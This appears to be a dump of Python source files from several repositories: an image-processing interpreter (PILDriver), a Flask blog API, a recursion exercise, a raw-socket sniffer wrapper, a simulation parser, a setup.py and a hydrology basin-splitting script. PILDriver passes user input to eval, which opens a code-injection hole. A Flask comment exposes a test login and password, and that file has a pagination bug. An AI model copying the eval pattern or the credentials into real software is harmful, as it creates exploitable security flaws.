<string:filtername> <image:pic1>\n\n        Process the top image with the given filter.\n        \"\"\"\n        import ImageFilter\n        filter = eval(\"ImageFilter.\" + string.upper(self.do_pop()))\n        image = self.do_pop()\n        self.push(image.filter(filter))\n\n    def do_getbbox(self):\n        \"\"\"usage: getbbox\n\n        Push left, upper, right, and lower pixel coordinates of the top image.\n        \"\"\"\n        bounding_box = self.do_pop().getbbox()\n        self.push(bounding_box[3])\n        self.push(bounding_box[2])\n        self.push(bounding_box[1])\n        self.push(bounding_box[0])\n\n    def do_getextrema(self):\n        \"\"\"usage: extrema\n\n        Push minimum and maximum pixel values of the top image.\n        \"\"\"\n        extrema = self.do_pop().extrema()\n        self.push(extrema[1])\n        self.push(extrema[0])\n\n    def do_offset(self):\n        \"\"\"usage: offset <int:xoffset> <int:yoffset> <image:pic1>\n\n        Offset the pixels in the top image.\n        \"\"\"\n        xoff = int(self.do_pop())\n        yoff = int(self.do_pop())\n        image = self.do_pop()\n        self.push(image.offset(xoff, yoff))\n\n    def do_paste(self):\n        \"\"\"usage: paste <image:figure> <int:xoffset> <int:yoffset> <image:ground>\n\n        Paste figure image into ground with upper left at given offsets.\n        \"\"\"\n        figure = self.do_pop()\n        xoff = int(self.do_pop())\n        yoff = int(self.do_pop())\n        ground = self.do_pop()\n        if figure.mode == \"RGBA\":\n            ground.paste(figure, (xoff, yoff), figure)\n        else:\n            ground.paste(figure, (xoff, yoff))\n        self.push(ground)\n\n    def do_resize(self):\n        \"\"\"usage: resize <int:xsize> <int:ysize> <image:pic1>\n\n        Resize the top image.\n        \"\"\"\n        ysize = int(self.do_pop())\n        xsize = int(self.do_pop())\n        image = self.do_pop()\n        self.push(image.resize((xsize, ysize)))\n\n    def do_rotate(self):\n        \"\"\"usage: rotate <int:angle> <image:pic1>\n\n        Rotate image through a given angle\n        \"\"\"\n        angle = int(self.do_pop())\n        image = self.do_pop()\n        self.push(image.rotate(angle))\n\n    def do_save(self):\n        \"\"\"usage: save <string:filename> <image:pic1>\n\n        Save image with default options.\n        \"\"\"\n        filename = self.do_pop()\n        image = self.do_pop()\n        image.save(filename)\n\n    def do_save2(self):\n        \"\"\"usage: save2 <string:filename> <string:options> <image:pic1>\n\n        Save image with specified options.\n        \"\"\"\n        filename = self.do_pop()\n        options = self.do_pop()\n        image = self.do_pop()\n        image.save(filename, None, options)\n\n    def do_show(self):\n        \"\"\"usage: show <image:pic1>\n\n        Display and pop the top image.\n        \"\"\"\n        self.do_pop().show()\n\n    def do_thumbnail(self):\n        \"\"\"usage: thumbnail <int:xsize> <int:ysize> <image:pic1>\n\n        Modify the top image in the stack to contain a thumbnail of itself.\n        \"\"\"\n        ysize = int(self.do_pop())\n        xsize = int(self.do_pop())\n        self.top().thumbnail((xsize, ysize))\n\n    def do_transpose(self):\n        \"\"\"usage: transpose <string:operator> <image:pic1>\n\n        Transpose the top image.\n        \"\"\"\n        transpose = string.upper(self.do_pop())\n        image = self.do_pop()\n        self.push(image.transpose(transpose))\n\n    # Image attributes\n\n    def do_format(self):\n        \"\"\"usage: format <image:pic1>\n\n        Push the format of the top image onto the stack.\n        \"\"\"\n        self.push(self.pop().format)\n\n    def do_mode(self):\n        \"\"\"usage: mode <image:pic1>\n\n        Push the mode of the top image onto the stack.\n        \"\"\"\n        self.push(self.pop().mode)\n\n    def do_size(self):\n        \"\"\"usage: size <image:pic1>\n\n        Push the image size on the stack as (y, x).\n        \"\"\"\n        size = self.pop().size\n        self.push(size[0])\n        self.push(size[1])\n\n    # ImageChops operations\n\n    def do_invert(self):\n        \"\"\"usage: invert <image:pic1>\n\n        Invert the top image.\n        \"\"\"\n        import ImageChops\n        self.push(ImageChops.invert(self.do_pop()))\n\n    def do_lighter(self):\n        \"\"\"usage: lighter <image:pic1> <image:pic2>\n\n        Pop the two top images, push an image of the lighter pixels of both.\n        \"\"\"\n        import ImageChops\n        image1 = self.do_pop()\n        image2 = self.do_pop()\n        self.push(ImageChops.lighter(image1, image2))\n\n    def do_darker(self):\n        \"\"\"usage: darker <image:pic1> <image:pic2>\n\n        Pop the two top images, push an image of the darker pixels of both.\n        \"\"\"\n        import ImageChops\n        image1 = self.do_pop()\n        image2 = self.do_pop()\n        self.push(ImageChops.darker(image1, image2))\n\n    def do_difference(self):\n        \"\"\"usage: difference <image:pic1> <image:pic2>\n\n        Pop the two top images, push the difference image\n        \"\"\"\n        import ImageChops\n        image1 = self.do_pop()\n        image2 = self.do_pop()\n        self.push(ImageChops.difference(image1, image2))\n\n    def do_multiply(self):\n        \"\"\"usage: multiply <image:pic1> <image:pic2>\n\n        Pop the two top images, push the multiplication image.\n        \"\"\"\n        import ImageChops\n        image1 = self.do_pop()\n        image2 = self.do_pop()\n        self.push(ImageChops.multiply(image1, image2))\n\n    def do_screen(self):\n        \"\"\"usage: screen <image:pic1> <image:pic2>\n\n        Pop the two top images, superimpose their inverted versions.\n        \"\"\"\n        import ImageChops\n        image2 = self.do_pop()\n        image1 = self.do_pop()\n        self.push(ImageChops.screen(image1, image2))\n\n    def do_add(self):\n        \"\"\"usage: add <image:pic1> <image:pic2> <int:offset> <float:scale>\n\n        Pop the two top images, produce the scaled sum with offset.\n        \"\"\"\n        import ImageChops\n        image1 = self.do_pop()\n        image2 = self.do_pop()\n        scale = float(self.do_pop())\n        offset = int(self.do_pop())\n        self.push(ImageChops.add(image1, image2, scale, offset))\n\n    def do_subtract(self):\n        \"\"\"usage: subtract <image:pic1> <image:pic2> <int:offset> <float:scale>\n\n        Pop the two top images, produce the scaled difference with offset.\n        \"\"\"\n        import ImageChops\n        image1 = self.do_pop()\n        image2 = self.do_pop()\n        scale = float(self.do_pop())\n        offset = int(self.do_pop())\n        self.push(ImageChops.subtract(image1, image2, scale, offset))\n\n    # ImageEnhance classes\n\n    def do_color(self):\n        \"\"\"usage: color <image:pic1>\n\n        Enhance color in the top image.\n        \"\"\"\n        import ImageEnhance\n        factor = float(self.do_pop())\n        image = self.do_pop()\n        enhancer = ImageEnhance.Color(image)\n        self.push(enhancer.enhance(factor))\n\n    def do_contrast(self):\n        \"\"\"usage: contrast <image:pic1>\n\n        Enhance contrast in the top image.\n        \"\"\"\n        import ImageEnhance\n        factor = float(self.do_pop())\n        image = self.do_pop()\n        enhancer = ImageEnhance.Color(image)\n        self.push(enhancer.enhance(factor))\n\n    def do_brightness(self):\n        \"\"\"usage: brightness <image:pic1>\n\n        Enhance brightness in the top image.\n        \"\"\"\n        import ImageEnhance\n        factor = float(self.do_pop())\n        image = self.do_pop()\n        enhancer = ImageEnhance.Color(image)\n        self.push(enhancer.enhance(factor))\n\n    def do_sharpness(self):\n        \"\"\"usage: sharpness <image:pic1>\n\n        Enhance sharpness in the top image.\n        \"\"\"\n        import ImageEnhance\n        factor = float(self.do_pop())\n        image = self.do_pop()\n        enhancer = ImageEnhance.Color(image)\n        self.push(enhancer.enhance(factor))\n\n    # The interpreter loop\n\n    def execute(self, list):\n        \"Interpret a list of PILDriver commands.\"\n        list.reverse()\n        while len(list) > 0:\n            self.push(list[0])\n            list = list[1:]\n            if self.verbose:\n                print \"Stack: \" + `self.stack`\n            top = self.top()\n            if type(top) != type(\"\"):\n                continue;\n            funcname = \"do_\" + top\n            if not hasattr(self, funcname):\n                continue\n            else:\n                self.do_pop()\n                func = getattr(self, funcname)\n                func()\n\nif __name__ == '__main__':\n    import sys\n    try:\n        import readline\n    except ImportError:\n        pass # not available on all platforms\n\n    # If we see command-line arguments, interpret them as a stack state\n    # and execute.  Otherwise go interactive.\n\n    driver = PILDriver()\n    if len(sys.argv[1:]) > 0:\n        driver.execute(sys.argv[1:])\n    else:\n        print \"PILDriver says hello.\"\n        while 1:\n            try:\n                line = raw_input('pildriver> ');\n            except EOFError:\n                print \"\\nPILDriver says goodbye.\"\n                break\n            driver.execute(string.split(line))\n            print driver.stack\n\n# The following sets edit modes for GNU EMACS\n# Local Variables:\n# mode:python\n# End:\n"}
{"blob_id": "a8ad52bbc3fd7fb374519a87b1a530b4b3200688", "directory_id": "23ab74d36baafb214e5dd489470dd01c6503de3d", "path": "/flasky/app/api_1_0/posts.py", "content_id": "f36ee4af11498cce34e88050541cd4b265117783", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "836426094/News_study_Environmental_Protection", "snapshot_id": "8cf1fac29e71e2531fbe83fa41c33bff1b1428b9", "revision_id": "bc827c96a3aa44713df304f15cd162b7297f7d46", "branch_name": "refs/heads/master", "visit_date": "2022-12-09 17:34:52.181027", "revision_date": "2019-03-20 13:22:18", "committer_date": "2019-03-20 13:22:18", "github_id": "174677207", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2669", "extension": "py", "content": "#coding=utf-8\n\n\nfrom . import api\nfrom flask import jsonify,request,g,abort,url_for,current_app\nfrom .. import db\nfrom ..decorators import permission_required\nfrom .errors import forbidden\n# from ..auth import auth\n\nfrom ..models import Post,Permission\n\n#\u6587\u7ae0\u8d44\u6e90\u7684get\u8bf7\u6c42\u7684\u5904\u7406\u7a0b\u5e8f\n\n#\n\n\n\n\n#\u6587\u7ae0\u8d44\u6e90post\u8bf7\u6c42\u7684\u5904\u7406\u7a0b\u5e8f\n@api.route('/posts/', methods=['POST'])\n@permission_required(Permission.WRITE_ARTICLES)\ndef new_post():\n    post = Post.from_json(request.json)\n    post.author = g.current_user\n    db.session.add(post)\n    db.session.commit()\n    return jsonify(post.to_json()), 201, \\\n           {'Location': url_for('api.get_post', id=post.id, _external=True)}\n\n#\u6587\u7ae0\u8d44\u6e90\u8bf7\u6c42put\u7684\u8bf7\u6c42\u5904\u7406\u7a0b\u5e8f\n@api.route('/posts/<int:id>', methods=['PUT'])\n@permission_required(Permission.WRITE_ARTICLES)\ndef edit_post(id):\n    post = Post.query.get_or_404(id)\n    if g.current_user != post.author and \\\n            not g.current_user.can(Permission.ADMINISTER):\n        return forbidden('Insufficient permissions')\n    post.body = request.json.get('body', post.body)\n    db.session.add(post)\n    return jsonify(post.to_json())\n\n\n# #\u8fd9\u4e2a\u51fd\u6570\u4f7f\u7528\u5217\u8868\u63a8\u5bfc\u751f\u6210\u6240\u6709\u6587\u7ae0\u7684JSON\u7248\u672c\u3002\n# @api.route('/posts/<int:id>')\n# @auth.login_required\n# def get_post(id):\n#     post = Post.query.get_or_404(id)\n#     return jsonify(post.to_json())\n#\n#\n# #\u5904\u7406\u83b7\u53d6\u6587\u7ae0\u96c6\u5408\u7684\u8bf7\u6c42\n# @api.route('/posts/')\n# @auth.login_required\n# def get_posts_all():\n#     posts = Post.query.all()\n#     return jsonify({ 'posts': [post.to_json() for post in posts] })\n\n# \u5206\u9875\u6587\u7ae0\u8d44\u6e90\n@api.route('/posts/')\ndef get_posts():\n    page = request.args.get('page', 1, type=int)\n    pagination = Post.query.paginate(\n                                      page, per_page=current_app.config['FLASKY_POSTS_PER_PAGE'],\n                                      error_out=False)\n    posts = pagination.items\n    prev = None\n    print 'fdakjfddsakfjdsakljfd'\n    if pagination.has_prev:\n        prev = url_for('api.get_posts', page=page-1, _external=True)\n        next = None\n        print '1fdakjfddsakfjdsakljfd'\n\n    if pagination.has_next:\n        next = url_for('api.get_posts', page=page+1, _external=True)\n        print '2'\n\n\n    print '3fdakjfddsakfjdsakljfd'\n\n    return jsonify({\n                     'posts': [post.to_json() for post in posts],\n                     'prev': prev,\n                     'next': next,\n                     'count': pagination.total\n                     })\n\n# http --json --auth 836426094@qq.com:123 GET http://127.0.0.1:5000/api/vi.0/posts/\n# http --json --auth 774213166@qq.com:123 GET http://127.0.0.1:5000/api/v1.0/posts/"}
{"blob_id": "b5547af741fd14b12f173dca5d50473b94783cf1", "directory_id": "3f8215e5a4626e3baa22c3cc6682674e1c760fb3", "path": "/recursion/reverse-list-printer-problem3-pythonic-way-ver1.py", "content_id": "b4c4ae1dcea4a65ff81e1d12129faf801adc1467", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "amos1969/tough-topics", "snapshot_id": "3ca763554ae97f7f6263886f185d03796adaa55f", "revision_id": "61cb5622015f8c516716be67c1c9b59d3f92dc71", "branch_name": "refs/heads/master", "visit_date": "2021-10-08 02:37:17.741504", "revision_date": "2018-12-06 16:00:26", "committer_date": "2018-12-06 16:00:26", "github_id": "113313395", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "345", "extension": "py", "content": "def reverse_list_printer(some_list):\n    \"\"\"Takes a list and the length of the list and \n    recursively prints the elements of the list\"\"\"\n    # Base case\n    if len(some_list) == 0:\n        return\n    #Recursive bits\n    print(some_list[-1])\n    reverse_list_printer(some_list[:-1])\n\nmy_list = [1, 2, 3, 4, 5, 6]\nreverse_list_printer(my_list)\n"}
{"blob_id": "d2417403edda9350ac53cb6089023605b52932f2", "directory_id": "c9faa0e53a8b2a61cca4a509c00533d31dc9e23d", "path": "/utils/socketWrapper.py", "content_id": "474e94e85b93336b93345446784fc62d7ec1b274", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "IvanSibirtsev/Sniffer", "snapshot_id": "5c2af48be970af4a78b26141eab9502d589660b5", "revision_id": "6588689baec744e4df666a79b0421d889e572416", "branch_name": "refs/heads/main", "visit_date": "2023-01-10 13:16:31.792792", "revision_date": "2020-11-13 13:45:19", "committer_date": "2020-11-13 13:45:19", "github_id": "301925923", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "432", "extension": "py", "content": "import socket as s\nimport sys\n\n\nclass Socket:\n    ALL_DATA = 65565\n\n    def __init__(self):\n        try:\n            self.socket = s.socket(s.AF_PACKET, s.SOCK_RAW, s.ntohs(3))\n        except AttributeError:\n            print('Use Linux.')\n            sys.exit()\n        except PermissionError:\n            print('Try sudo.')\n            sys.exit()\n\n    def receive_from(self):\n        return self.socket.recvfrom(self.ALL_DATA)[0]\n"}
{"blob_id": "b734607bb98232aba5c08fbf7b0d204352c8348e", "directory_id": "cac43e8d506ab79074ea4c5fb469f70ea7e6da81", "path": "/simulation/simulation_results_parser.py", "content_id": "85d557483acb2cb51db1cb71f98c18df0047687f", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "fubuloubu/ad-hoc-networking", "snapshot_id": "63b14cb80c6013a84764f65b7fcef275dd7c673e", "revision_id": "b63f266ab6b90c2b77182cecf2f04749a5e7fa25", "branch_name": "refs/heads/master", "visit_date": "2020-06-10 20:37:25.883649", "revision_date": "2016-12-23 00:07:17", "committer_date": "2016-12-23 00:07:17", "github_id": "75881214", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "4694", "extension": "py", "content": "#!/usr/bin/python3\nimport print_data_model\n\n# Typical Results looks like:\nexample = '''\nStatistics:\nTotal Messages: 64\nSuccesfully Received Messages: 6\nSuccess Rate: 9.38%\nNumber of Retransmissions: 188\nAverage Latency: 0.00 [steps]\n\nStatistics:\nTotal Messages: 52\nSuccesfully Received Messages: 4\nSuccess Rate: 7.69%\nNumber of Retransmissions: 208\nAverage Latency: 0.00 [steps]\n\nStatistics:\nTotal Messages: 53\nSuccesfully Received Messages: 4\nSuccess Rate: 7.55%\nNumber of Retransmissions: 188\nAverage Latency: 0.00 [steps]\n'''\n# NOTE: Multiple Simulations possible...\n\ndef sanitize(resultsStr):\n    resultsStr = resultsStr.lstrip().rstrip()\n    oldLen = 0\n    while (len(resultsStr) != oldLen):\n        resultsStr = resultsStr.replace('\\n\\n','\\n')\n        oldLen = len(resultsStr)\n    return resultsStr\n\nimport re\ndef extractMetrics(metricString):\n    metric = {}\n    metricString = metricString.split(': ')\n    metric[\"title\"] = metricString[0]\n    metric[\"mname\"] = metricString[0].lower().replace(' ','-')\n    match = re.search(r'([0-9.]+) *(.*)', metricString[1])\n    if match:\n        (data, units) = match.group(1,2)\n        metric[\"value\"] = data\n        metric[\"units\"] = 'none' if units == '' else \\\n            units.lstrip().replace('[','').replace(']','')\n    else:\n        raise ValueError(\"'{}' does not parse with regex\".format(metricString[1]))\n    return metric\n\n# Parse output of simulation run\nclass SimulationMetrics(print_data_model.MetricContainer):\n    def __init__(self, datastring):\n        # Clean data string and split by simulation run\n        simStats = sanitize(datastring).split('Statistics:\\n')\n        # Remove empty entries and split by line\n        simStats = filter(None, simStats)\n        simStats = map(lambda s: s.rstrip().split('\\n'), simStats)\n        # Parse each raw metric line into a metric object\n        # NOTE: Using list here because below we need to use it twice\n        simStats = list(map(lambda s: list(map(lambda ms: extractMetrics(ms), s)), simStats))\n        \n        # Make sure metric names in each simulation line up\n        # e.g. there are N duplicates of every metric in list\n        metricNames = map(lambda s: [ m[\"mname\"] for m in s], simStats)\n        def checkEqual(iterator):\n            iterator = iter(iterator)\n            try:\n                first = next(iterator)\n            except StopIteration:\n                return True\n            return all(first == rest for rest in iterator)\n        # Raise error if fault is found\n        if not checkEqual(metricNames):\n            raise ValueError(\"Simulations do not have matching metrics\")\n\n        # Create lists by mapping each simulation metric \n        # to unique metric name using position in list\n        metricNames  = [ m[\"mname\"] for m in simStats[0] ]\n        metricTitles = [ m[\"title\"] for m in simStats[0] ]\n        metricUnits  = [ m[\"units\"] for m in simStats[0] ]\n        \n        metric_list = []\n        title_list  = []\n        for i in range(len(simStats)):\n            for j in range(len(metricNames)):\n                metric_list.append(\"{1}-{0:02d}\".format(i+1, metricNames[j]))\n                title_list.append(\"Simulation {0} {1}\".\n                        format(i+1, metricTitles[j], metricUnits[j]))\n        \n        # Get data list by extracting value from metrics and flattening that list\n        from ast import literal_eval\n        # NOTE: Using list here because below we need to use it twice\n        metricData = list(map(lambda s: [ literal_eval(m[\"value\"]) for m in s], simStats))\n        data_list  = [item for sublist in metricData for item in sublist]\n        \n        # Create and append average metrics\n        # First transpose list of lists\n        avgMetricData = map(lambda *a: list(a), *metricData)\n        # Then do average by summing and dividing by number of entries\n        avgMetricData = map(lambda l: sum(l), avgMetricData)\n        avgMetricData = map(lambda s: s/float(len(simStats)), avgMetricData)\n        # NOTE: Using list here because below we need use subscripts\n        avgMetricData = list(avgMetricData)\n        # Finally append all average metrics to list\n        for i in range(len(metricNames)):\n            metric_list.append(\"avg-{0}\".format(metricNames[i]))\n            title_list.append(\"Simulation Average {0}\".\n                    format(metricTitles[i], metricUnits[i]))\n            data_list.append(avgMetricData[i])\n        \n        # Initialize container for all metrics we discovered\n        print_data_model.MetricContainer.__init__(self, metric_list, title_list, data_list)\n\n# Use argparsing from base module\nif __name__ == '__main__':\n    print_data_model.main(SimulationMetrics, example)\n"}
{"blob_id": "3f33e7095172bd89e54bfa34cbc1699ecfbf6875", "directory_id": "d91fd80dc9cf7a3b1ea5ec7e686b27043e9cf420", "path": "/setup.py", "content_id": "2de4efa06dcd1158c77a0ac9c48adb3d772c034f", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "zhd785576549/flamingo", "snapshot_id": "f5baf59716aa898f82b624354dbf5bfe745ebb8c", "revision_id": "5e8bf68bf5513862e4ec748490652e5e2c31b226", "branch_name": "refs/heads/main", "visit_date": "2023-02-12 15:02:02.987176", "revision_date": "2021-01-05 06:32:30", "committer_date": "2021-01-05 06:32:30", "github_id": "323849832", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "MIT", "gha_event_created_at": "2021-01-05 06:32:31", "gha_created_at": "2020-12-23 08:46:44", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "713", "extension": "py", "content": "from setuptools import setup, find_packages\n\nsetup(\n    name=\"flamingo\",\n    author=\"Dong Zhang\",\n    author_email=\"zhangd@lhcis.com\",\n    version=\"1.0.0\",\n    description=\"An async faster web framework.\",\n    license=\"MIT License\",\n    packages=find_packages(),\n    keywords=\"Async Faster Python Web Framework\",\n    include_package_data=True,\n    platforms=\"any\",\n    entry_points={\n        \"console_scripts\": [\n            'flamingo = flamingo.bin.flamingo:execute_from_argv',\n        ]\n    },\n    install_requires=[\n        \"uvicorn\",\n        \"bidict\",\n        \"werkzeug\",\n    ],\n    classifiers=[\n        \"Development Status :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n    ],\n    zip_safe=False\n)\n"}
{"blob_id": "8d83aaeac7f84ab5fb0f6811cdbe9b5467e72d64", "directory_id": "32d4399cd8f16680b2a76d23b3c5ba689944e72e", "path": "/split_basin.py", "content_id": "3a329373d33c8a6149e081b19f710ad8918fc31b", "detected_licenses": "['Apache-2.0']", "license_type": "permissive", "repo_name": "peironglinlin/Variable_drainage_density", "snapshot_id": "4eb44c3df71bd78b8a26fd1b54e0f79298f753f4", "revision_id": "da5b787ee4f61c26eb56d8741822da80723a918d", "branch_name": "refs/heads/master", "visit_date": "2022-08-03 03:39:24.949689", "revision_date": "2022-07-18 13:01:21", "committer_date": "2022-07-18 13:01:21", "github_id": "219064229", "star_events_count": "4", "fork_events_count": "2", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "7655", "extension": "py", "content": "import geopandas as gpd\nimport numpy as np\nimport pandas as pd\nfrom shapely.ops import cascaded_union\nimport os\n\n#This script splits the global basins (in total: 57025) following the Pfafstetter rules until all basins are under 5000 km2\n#Peirong Lin, October 2019\n\ndef trace_upstream_id(COMID,riv):\n    #function to trace the entire network upstream of river with ID equaling COMID\n    #riv: whole network shapefile as GeoDataFrame; COMID: ID of river needs tracing upstream    \n    if COMID not in riv:\n        return [COMID]\n    else:\n        list_up_id = [COMID]\n        for i in riv[COMID]:\n            list_up_id += trace_upstream_id(i,riv)\n        return list_up_id\n    \ndef trace_interbasin(list_main,list_trib,riv):\n    idlist = list_main\n    for trib_id in list_trib:\n        idlist += trace_upstream_id(trib_id,riv)\n    return idlist\n        \ndef to_list_up_id(x):\n    result = []\n    for c in ['up1','up2','up3','up4']:\n        if x[c]!=0:\n            result += [x[c]]\n    if len(result)==0:\n        result = np.nan\n    return result\n\ndef convert2dict_upid(df):\n    df['up_list'] = df.apply(to_list_up_id,axis=1)\n    df_tmp = df[['COMID','up_list']].dropna()\n    df_dict = dict(zip(df_tmp.COMID,df_tmp.up_list))\n    del df['up_list']\n    return df_dict\n\ndef read_all_rivers():\n    list_df = []\n    column_wanted = ['COMID','NextDownID','uparea','up1','up2','up3','up4','geometry']\n    path = '../../../MERIT/raster/cleaned/new_shapefiles/shapefile_props/level_01/'\n    for pfaf in range(1,9):\n        print('... read river network pfaf = %02d ...'%pfaf)\n        fn = os.path.join(path,'pfaf_%02d_riv_3sMERIT_props.shp'%pfaf)\n        \n        df_tmp = gpd.read_file(fn)[column_wanted]\n        list_df.append(df_tmp)\n    return pd.concat(list_df)\n\ndef find_main_stream(df_basin):\n    df_sort = df_basin.sort_values(by='uparea',ascending=False) #prepare for drop_duplicates\n    df_sort = df_sort.drop_duplicates(subset=['NextDownID'],keep='first')\n    return df_sort\n\ndef find_outlet_id(df_basin):\n    #most downstream reach ID\n    return df_basin['COMID'][df_basin.uparea==df_basin.uparea.max()].values[0]\n\ndef find_list_main_id(outlet_id,upID_dict):\n    #find all main stem reach ID\n    list_main_id = [outlet_id]  \n    while outlet_id in upID_dict:\n        outlet_id = upID_dict[outlet_id]\n        list_main_id.append(outlet_id)\n    return list_main_id\n\ndef mark_tributary_and_interbasins(df_basin,df_main,trib_to_trace,list_main_id,df_trib):\n    df_basin_dict = convert2dict_upid(df_basin)\n    #find four largest tributary basins\n    codes = [2,4,6,8]\n    df_basin['code'] = 0\n    for i,trib_id in enumerate(trib_to_trace['COMID']):\n        idlist = trace_upstream_id(trib_id,df_basin_dict)\n        df_basin.loc[df_basin['COMID'].isin(idlist),'code'] = codes[i]\n    \n    codes = [9,7,5,3,1]\n    newmain = df_main[df_main['NextDownID'].isin(trib_to_trace['NextDownID'])]\n    newmain = newmain.sort_values(by='uparea',ascending=True).reset_index().drop(columns=['index'])\n    indices = [np.where(list_main_id==newmain['COMID'][i])[0][0] for i in range(len(newmain))]\n    for i in range(len(indices)+1):\n        if i == 0:\n            list_main = list_main_id[indices[i]:len(list_main_id)] #main\n        elif i == len(indices):\n            list_main = list_main_id[0:indices[i-1]]\n        else:\n            list_main = list_main_id[indices[i]:indices[i-1]]\n        list_trib = df_trib[(df_trib['NextDownID'].isin(list_main)) & \n                         (~df_trib['COMID'].isin(trib_to_trace['COMID']))]['COMID'].values.tolist()\n        idlist = trace_interbasin(list_main,list_trib,df_basin_dict)\n        df_basin.loc[df_basin['COMID'].isin(idlist),'code'] = codes[i]                \n    return df_basin['code'].values\n\ndef read_all_area():\n    #read catchment area file\n    df_area = pd.DataFrame({})\n    path = '../../../MERIT/raster/cleaned/new_shapefiles/tables_v0.2/'\n    for pfaf in range(1,9):\n        fn = os.path.join(path,'area_catchment_pfaf_%02d.csv'%pfaf)\n        df_area = df_area.append(pd.read_csv(fn)) \n    return df_area\n   \ndef update_basid(df_sub_basin):\n    #find main, tributary, outlet, and the four largest tributary for each subbasin\n    df_all_main = find_main_stream(df_sub_basin) #finding possible main stems\n    df_all_tributary = df_sub_basin[~df_sub_basin['COMID'].isin(df_all_main['COMID'])]\n    upID_dict = dict(zip(df_all_main.NextDownID,df_all_main.COMID))\n    \n    outlet_id = find_outlet_id(df_sub_basin) #most downstream reach ID\n    list_main_id = find_list_main_id(outlet_id,upID_dict) #find all main stem reach ID\n    df_main = df_sub_basin[df_sub_basin['COMID'].isin(list_main_id)]\n    df_trib = df_all_tributary[df_all_tributary['NextDownID'].isin(list_main_id)] #find all tributary reach ID\n    df_trib = df_trib.sort_values(by='uparea',ascending=False).reset_index().drop(columns=['index'])\n    trib_to_trace = df_trib[0:4]\n\n    if len(list_main_id)<5:\n        df_sub_basin['code'] = ''\n    else:\n        new_codes = mark_tributary_and_interbasins(df_sub_basin,df_main,trib_to_trace,list_main_id,df_trib)  \n        df_sub_basin['code'] = new_codes\n    df_sub_basin['basid'] = df_sub_basin['basid'].map(str)+df_sub_basin['code'].map(str)\n    del df_sub_basin['code']\n    return df_sub_basin\n \ndef split_basin(df_basin):\n    df_basin['basin_area'] = df_basin.groupby('basid')['area'].transform('sum')\n    all_area = df_basin.groupby('basid')['area'].sum()\n    n_to_trace = (all_area>=5000).sum()\n\n    if n_to_trace == 0:\n        return [df_basin]\n    else:\n        list_df = []\n        for i,idnow in enumerate(df_basin['basid'].unique()):\n            df_sub_basin = df_basin[df_basin['basid']==idnow]\n            # if all_area[idnow]<5000:\n                # df_sub_basin['basid'] = df_sub_basin['basid'].map(str)+'0'\n            if all_area[idnow]>=5000:\n                df_sub_basin = update_basid(df_sub_basin)\n                if len(df_sub_basin.basid.unique()) == 1:\n                    list_df += [df_sub_basin]\n                    continue\n\n            list_df += split_basin(df_sub_basin)\n\n    return list_df\n\n\nif __name__=='__main__': \n    cat = gpd.read_file('cleaned_catc/pfaf_all_catc_area.shp')\n    cat['basid'] = cat['basid'].astype('int32')\n    cat = cat[cat['areasqkm']>=5000]\n    to_trace = cat['basid'].unique()\n    n_to_trace = len(to_trace)\n    print('... remaining basins that need decoding: %s ...'%n_to_trace)\n\n    rr = 0\n    df_all_rivers = read_all_rivers()\n    df_all_rivers = gpd.sjoin(df_all_rivers,cat,op='within',how='inner')\n\n    #add area attribute and orig_id\n    df_area = read_all_area()\n    df_all_rivers = df_all_rivers.merge(df_area,on='COMID',how='inner')\n    df_all_rivers['orig_id'] = df_all_rivers['basid']\n\n    column_wanted = ['basid','COMID','orig_id','area','uparea','NextDownID','up1','up2','up3','up4']\n    df_all_rivers = df_all_rivers[column_wanted]\n    df_all_rivers.to_pickle('test_data.pkl')\n\n    df_all_rivers = pd.read_pickle('test_data.pkl')\n    # import pdb;pdb.set_trace()\n\n    measurer = np.vectorize(len)\n\n    for i,idnow in enumerate(to_trace[0:]):\n        print('   ... decoding for %s ...'%idnow)  \n        df_basin = df_all_rivers[df_all_rivers['basid']==idnow]\n\n        #split basin for each catc > 5000 km2\n        df_new_basin = pd.concat(split_basin(df_basin))\n        max_len = measurer(df_new_basin['basid'].values.astype(str)).max(axis=0)\n\n        # import pdb;pdb.set_trace()\n        df_new_basin['basid'] = df_new_basin['basid'].astype(str).str.ljust(max_len, '0')\n        fon = 'outputs/decoded_basid_%s.csv'%idnow\n        print('   ... writing to %s ...'%fon)\n        df_new_basin.to_csv(fon,index=False)   \n    \n    \n        \n\n"}
